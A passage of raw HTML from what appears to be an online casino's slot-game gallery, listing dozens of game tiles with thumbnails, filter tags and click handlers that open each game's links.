          <h5 data-title="Mustang Gold">Mustang Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pixie Wings" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pixie Wings', '/assets/games/i/165x220/64e3ad6dc04b4458435976111886ba0b.webp?v=0.1' , 'vs50pixie', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/64e3ad6dc04b4458435976111886ba0b.webp?v=0.1" src="/assets/games/i/165x220/64e3ad6dc04b4458435976111886ba0b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pixie Wings">Pixie Wings</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="8 Dragons" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '8 Dragons', '/assets/games/i/165x220/a08c0602b7f1b0a0823ed32e4c784339.webp?v=0.1' , 'vs20eightdragons', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a08c0602b7f1b0a0823ed32e4c784339.webp?v=0.1" src="/assets/games/i/165x220/a08c0602b7f1b0a0823ed32e4c784339.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="8 Dragons">8 Dragons</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Journey to the West" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Journey to the West', '/assets/games/i/165x220/f0b3b47c4405fd8a1bdbb546067bcdc5.webp?v=0.1' , 'vs25journey', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f0b3b47c4405fd8a1bdbb546067bcdc5.webp?v=0.1" src="/assets/games/i/165x220/f0b3b47c4405fd8a1bdbb546067bcdc5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Journey to the West">Journey to the West</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Vegas Magic" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Vegas Magic', '/assets/games/i/165x220/9a0c27bcdffd65dd1c1b28ede5df443f.webp?v=0.1' , 'vs20vegasmagic', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9a0c27bcdffd65dd1c1b28ede5df443f.webp?v=0.1" src="/assets/games/i/165x220/9a0c27bcdffd65dd1c1b28ede5df443f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Vegas Magic">Vegas Magic</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pandas Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pandas Fortune', '/assets/games/i/165x220/dc6201034f3d8093846543f2ab122c10.webp?v=0.1' , 'vs25pandagold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/dc6201034f3d8093846543f2ab122c10.webp?v=0.1" src="/assets/games/i/165x220/dc6201034f3d8093846543f2ab122c10.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pandas Fortune">Pandas Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Leprechaun Carol" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Leprechaun Carol', '/assets/games/i/165x220/860238636dc688b709b683fab461d98c.webp?v=0.1' , 'vs20leprexmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/860238636dc688b709b683fab461d98c.webp?v=0.1" src="/assets/games/i/165x220/860238636dc688b709b683fab461d98c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Leprechaun Carol">Leprechaun Carol</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Diamond Strike" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Diamond Strike', '/assets/games/i/165x220/ba5656e6f587cb3effe936af11d9c737.webp?v=0.1' , 'vs15diamond', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ba5656e6f587cb3effe936af11d9c737.webp?v=0.1" src="/assets/games/i/165x220/ba5656e6f587cb3effe936af11d9c737.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Diamond Strike">Diamond Strike</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Master Joker" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Master Joker', '/assets/games/i/165x220/f9665ada655a73b357531ef2a8d33201.webp?v=0.1' , 'vs1masterjoker', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f9665ada655a73b357531ef2a8d33201.webp?v=0.1" src="/assets/games/i/165x220/f9665ada655a73b357531ef2a8d33201.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Master Joker">Master Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Honey Honey Honey" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Honey Honey Honey', '/assets/games/i/165x220/6829ef6e0752a52398762d9a9a411ef6.webp?v=0.1' , 'vs20honey', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6829ef6e0752a52398762d9a9a411ef6.webp?v=0.1" src="/assets/games/i/165x220/6829ef6e0752a52398762d9a9a411ef6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Honey Honey Honey">Honey Honey Honey</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hercules Son of Zeus" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hercules Son of Zeus', '/assets/games/i/165x220/6a9f5a01ed94ba8b8625436708e6bbcf.webp?v=0.1' , 'vs50hercules', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6a9f5a01ed94ba8b8625436708e6bbcf.webp?v=0.1" src="/assets/games/i/165x220/6a9f5a01ed94ba8b8625436708e6bbcf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hercules Son of Zeus">Hercules Son of Zeus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lady Godiva" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lady Godiva', '/assets/games/i/165x220/52c74744d552a8874f273ff99db53908.webp?v=0.1' , 'vs20godiva', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/52c74744d552a8874f273ff99db53908.webp?v=0.1" src="/assets/games/i/165x220/52c74744d552a8874f273ff99db53908.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lady Godiva">Lady Godiva</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot Safari" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot Safari', '/assets/games/i/165x220/b4aa77011ad198914349e605a1712762.webp?v=0.1' , 'vs25safari', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b4aa77011ad198914349e605a1712762.webp?v=0.1" src="/assets/games/i/165x220/b4aa77011ad198914349e605a1712762.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot Safari">Hot Safari</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Irish Charms" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Irish Charms', '/assets/games/i/165x220/727cdcb3470a6d06fb61bdfb0dd949a9.webp?v=0.1' , 'cs3irishcharms', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/727cdcb3470a6d06fb61bdfb0dd949a9.webp?v=0.1" src="/assets/games/i/165x220/727cdcb3470a6d06fb61bdfb0dd949a9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Irish Charms">Irish Charms</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Train" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Train', '/assets/games/i/165x220/f8fccae98fdfe3ab796bb7c8cdcef1e6.webp?v=0.1' , 'vs3train', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f8fccae98fdfe3ab796bb7c8cdcef1e6.webp?v=0.1" src="/assets/games/i/165x220/f8fccae98fdfe3ab796bb7c8cdcef1e6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Train">Gold Train</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Dragons" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Dragons', '/assets/games/i/165x220/a76356d8be4f02927e1fad5dcb16ea51.webp?v=0.1' , 'vs50chinesecharms', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a76356d8be4f02927e1fad5dcb16ea51.webp?v=0.1" src="/assets/games/i/165x220/a76356d8be4f02927e1fad5dcb16ea51.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Dragons">Lucky Dragons</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Money Mouse" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Money Mouse', '/assets/games/i/165x220/d285d5809bb80b882a89316db23295b6.webp?v=0.1' , 'vs25mmouse', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d285d5809bb80b882a89316db23295b6.webp?v=0.1" src="/assets/games/i/165x220/d285d5809bb80b882a89316db23295b6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Money Mouse">Money Mouse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ancient Egypt Classic" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ancient Egypt Classic', '/assets/games/i/165x220/f8cf3f6cb17582b46936ea3e39ad40dd.webp?v=0.1' , 'vs10egyptcls', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f8cf3f6cb17582b46936ea3e39ad40dd.webp?v=0.1" src="/assets/games/i/165x220/f8cf3f6cb17582b46936ea3e39ad40dd.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ancient Egypt Classic">Ancient Egypt Classic</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Release the Kraken" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Release the Kraken', '/assets/games/i/165x220/68de4da213704776d1ed6df63746c80e.webp?v=0.1' , 'vs20kraken', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/68de4da213704776d1ed6df63746c80e.webp?v=0.1" src="/assets/games/i/165x220/68de4da213704776d1ed6df63746c80e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Release the Kraken">Release the Kraken</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Strike" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Strike', '/assets/games/i/165x220/8a943fbb37bba0f4a697a70932220458.webp?v=0.1' , 'vs10firestrike', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8a943fbb37bba0f4a697a70932220458.webp?v=0.1" src="/assets/games/i/165x220/8a943fbb37bba0f4a697a70932220458.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Strike">Fire Strike</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Devils 13" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Devils 13', '/assets/games/i/165x220/c7b3847837fae34e403db0ace69c7736.webp?v=0.1' , 'vs13g', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c7b3847837fae34e403db0ace69c7736.webp?v=0.1" src="/assets/games/i/165x220/c7b3847837fae34e403db0ace69c7736.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Devils 13">Devils 13</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Queen of Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Queen of Gold', '/assets/games/i/165x220/fa77365de2ee7d8abd30cd0389f84931.webp?v=0.1' , 'vs25queenofgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fa77365de2ee7d8abd30cd0389f84931.webp?v=0.1" src="/assets/games/i/165x220/fa77365de2ee7d8abd30cd0389f84931.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Queen of Gold">Queen of Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa', '/assets/games/i/165x220/39617d7fc3e5345c762f3b67cb97d457.webp?v=0.1' , 'vs20santa', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/39617d7fc3e5345c762f3b67cb97d457.webp?v=0.1" src="/assets/games/i/165x220/39617d7fc3e5345c762f3b67cb97d457.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa">Santa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Extra Juicy" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Extra Juicy', '/assets/games/i/165x220/4324a718238c45527eede1a1f509938f.webp?v=0.1' , 'vs10fruity2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4324a718238c45527eede1a1f509938f.webp?v=0.1" src="/assets/games/i/165x220/4324a718238c45527eede1a1f509938f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Extra Juicy">Extra Juicy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Leprechaun Song" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Leprechaun Song', '/assets/games/i/165x220/d3eb61444f9a5575e4b703faf45a31d7.webp?v=0.1' , 'vs20leprechaun', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d3eb61444f9a5575e4b703faf45a31d7.webp?v=0.1" src="/assets/games/i/165x220/d3eb61444f9a5575e4b703faf45a31d7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Leprechaun Song">Leprechaun Song</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Madame Destiny" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Madame Destiny', '/assets/games/i/165x220/e6526f050b52cd1752584dc959f9350d.webp?v=0.1' , 'vs10madame', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e6526f050b52cd1752584dc959f9350d.webp?v=0.1" src="/assets/games/i/165x220/e6526f050b52cd1752584dc959f9350d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Madame Destiny">Madame Destiny</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fairytale Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fairytale Fortune', '/assets/games/i/165x220/89dfcfce804ca8aafdbeaa32694f9c36.webp?v=0.1' , 'vs15fairytale', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/89dfcfce804ca8aafdbeaa32694f9c36.webp?v=0.1" src="/assets/games/i/165x220/89dfcfce804ca8aafdbeaa32694f9c36.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fairytale Fortune">Fairytale Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Gladiator" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Gladiator', '/assets/games/i/165x220/d308e9ea79d86002926b15ebc6df5c98.webp?v=0.1' , 'vs25gladiator', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d308e9ea79d86002926b15ebc6df5c98.webp?v=0.1" src="/assets/games/i/165x220/d308e9ea79d86002926b15ebc6df5c98.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Gladiator">Wild Gladiator</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jade Butterfly" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jade Butterfly', '/assets/games/i/165x220/720f62bae201c4e297994fcc352dbd0f.webp?v=0.1' , 'vs1024butterfly', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/720f62bae201c4e297994fcc352dbd0f.webp?v=0.1" src="/assets/games/i/165x220/720f62bae201c4e297994fcc352dbd0f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jade Butterfly">Jade Butterfly</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Safari King" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Safari King', '/assets/games/i/165x220/15753d19cfcbce43bef426c1f1eb812d.webp?v=0.1' , 'vs50safariking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/15753d19cfcbce43bef426c1f1eb812d.webp?v=0.1" src="/assets/games/i/165x220/15753d19cfcbce43bef426c1f1eb812d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Safari King">Safari King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Vegas Nights" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Vegas Nights', '/assets/games/i/165x220/fa0dd6ff466b01414b97ac536cc5a1dc.webp?v=0.1' , 'vs25vegas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fa0dd6ff466b01414b97ac536cc5a1dc.webp?v=0.1" src="/assets/games/i/165x220/fa0dd6ff466b01414b97ac536cc5a1dc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Vegas Nights">Vegas Nights</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Busy Bees" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Busy Bees', '/assets/games/i/165x220/5d6279e6a609af9cd496c22b63040d0d.webp?v=0.1' , 'vs20bl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5d6279e6a609af9cd496c22b63040d0d.webp?v=0.1" src="/assets/games/i/165x220/5d6279e6a609af9cd496c22b63040d0d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Busy Bees">Busy Bees</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super 7s" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super 7s', '/assets/games/i/165x220/26c95f75e4f31b398a6a474d6d1489d1.webp?v=0.1' , 'vs5super7', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/26c95f75e4f31b398a6a474d6d1489d1.webp?v=0.1" src="/assets/games/i/165x220/26c95f75e4f31b398a6a474d6d1489d1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super 7s">Super 7s</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Diamonds are Forever 3 Lines" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Diamonds are Forever 3 Lines', '/assets/games/i/165x220/1f2718f5d9c4c940f2fa14003265ca86.webp?v=0.1' , 'cs3w', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1f2718f5d9c4c940f2fa14003265ca86.webp?v=0.1" src="/assets/games/i/165x220/1f2718f5d9c4c940f2fa14003265ca86.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Diamonds are Forever 3 Lines">Diamonds are Forever 3 Lines</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Buffalo King" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Buffalo King', '/assets/games/i/165x220/871fd2e8a824031c207063895fcc4aad.webp?v=0.1' , 'vs4096bufking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/871fd2e8a824031c207063895fcc4aad.webp?v=0.1" src="/assets/games/i/165x220/871fd2e8a824031c207063895fcc4aad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Buffalo King">Buffalo King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hercules and Pegasus" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hercules and Pegasus', '/assets/games/i/165x220/925b65feb69b656da2b1340e1e752a56.webp?v=0.1' , 'vs20hercpeg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/925b65feb69b656da2b1340e1e752a56.webp?v=0.1" src="/assets/games/i/165x220/925b65feb69b656da2b1340e1e752a56.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hercules and Pegasus">Hercules and Pegasus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Joker" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Joker', '/assets/games/i/165x220/faf62591f0c5ad660b32b99b1fc97c3a.webp?v=0.1' , 'vs5spjoker', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/faf62591f0c5ad660b32b99b1fc97c3a.webp?v=0.1" src="/assets/games/i/165x220/faf62591f0c5ad660b32b99b1fc97c3a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Joker">Super Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza Xmas" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza Xmas', '/assets/games/i/165x220/c4652dc583962a1fb629205513180460.webp?v=0.1' , 'vs20sbxmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c4652dc583962a1fb629205513180460.webp?v=0.1" src="/assets/games/i/165x220/c4652dc583962a1fb629205513180460.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza Xmas">Sweet Bonanza Xmas</h5>
        </a>
        
     
